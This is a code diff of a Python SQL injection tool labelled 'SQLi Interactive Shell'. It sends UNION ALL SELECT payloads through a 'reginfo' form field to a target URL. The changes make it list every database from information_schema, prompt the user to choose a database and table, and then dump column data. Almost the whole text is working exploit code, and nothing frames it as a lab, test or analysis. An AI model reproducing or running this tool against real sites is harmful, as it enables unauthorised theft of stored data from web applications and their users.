@@ -9,9 +9,7 @@ HEADERS = {
 }
 
 def send_payload(payload):
-    data = {
-        "reginfo": payload
-    }
+    data = {"reginfo": payload}
     try:
         resp = requests.post(URL, headers=HEADERS, data=data)
         if resp.status_code == 200:
@@ -24,8 +22,8 @@ def extract_result(text):
     matches = re.findall(r'~(.*?)~', text)
     return matches[0] if matches else None
 
-def get_database():
-    payload = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,database(),0x7e)#"
+def get_all_databases():
+    payload = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e)#"
     resp = send_payload(payload)
     return extract_result(resp)
 
@@ -45,41 +43,49 @@ def dump_table(db, table, columns, limit=10):
     resp = send_payload(payload)
     return extract_result(resp)
 
+def choose_from_list(name, items):
+    print(f"\nSelect {name}:")
+    for i, item in enumerate(items):
+        print(f"  [{i}] {item}")
+    while True:
+        try:
+            idx = int(input(f"Enter {name} index: ").strip())
+            if 0 <= idx < len(items):
+                return items[idx]
+        except:
+            pass
+        print("Invalid input. Try again.")
+
 def interactive():
     print("== SQLi Interactive Shell ==")
-    current_db = None
 
-    while True:
-        cmd = input("> ").strip()
-        if cmd in ('exit', 'quit'):
-            break
-        elif cmd == 'dbs':
-            current_db = get_database()
-            print(f"[DB] {current_db}")
-        elif cmd == 'tables':
-            if not current_db:
-                print("[!] Run 'dbs' first")
-                continue
-            tables = get_tables(current_db)
-            print(f"[Tables] {tables}")
-        elif cmd.startswith('columns '):
-            if not current_db:
-                print("[!] Run 'dbs' first")
-                continue
-            _, table = cmd.split(maxsplit=1)
-            cols = get_columns(current_db, table)
-            print(f"[Columns] {cols}")
-        elif cmd.startswith('dump '):
-            if not current_db:
-                print("[!] Run 'dbs' first")
-                continue
-            _, table = cmd.split(maxsplit=1)
-            cols = get_columns(current_db, table)
-            print(f"[Columns] {cols}")
-            data = dump_table(current_db, table, cols)
-            print(f"[Data] {data}")
-        else:
-            print("[?] Unknown command")
+    # Step 1: Get all databases
+    raw_dbs = get_all_databases()
+    if not raw_dbs:
+        print("[!] Failed to retrieve databases.")
+        return
+
+    db_list = raw_dbs.split(',')
+    selected_db = choose_from_list("database", db_list)
+
+    # Step 2: Get tables
+    raw_tables = get_tables(selected_db)
+    if not raw_tables:
+        print("[!] Failed to retrieve tables.")
+        return
+    table_list = raw_tables.split(',')
+    selected_table = choose_from_list("table", table_list)
+
+    # Step 3: Get columns
+    raw_columns = get_columns(selected_db, selected_table)
+    if not raw_columns:
+        print("[!] Failed to retrieve columns.")
+        return
+    print(f"\n[Columns] {raw_columns}")
+
+    # Step 4: Dump data
+    data = dump_table(selected_db, selected_table, raw_columns)
+    print(f"\n[Data] {data}")
 
 if __name__ == "__main__":
     interactive()
